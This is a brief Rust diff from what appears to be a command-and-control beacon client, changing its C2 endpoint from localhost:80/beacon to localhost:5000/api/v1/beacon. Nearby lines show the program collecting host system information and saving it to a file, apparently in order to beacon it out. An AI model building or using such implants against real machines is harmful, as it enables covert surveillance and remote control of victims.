@@ -18,7 +18,7 @@ struct Beacon {
 async fn main() {
     let uuid: Uuid = sysinfo_saver::save_file().expect("Error saving file");
 
-    let c2_url = "http://localhost:80/beacon";
+    let c2_url = "http://localhost:5000/api/v1/beacon";
     let client = Client::new();
     let mut sys = System::new_all();
 
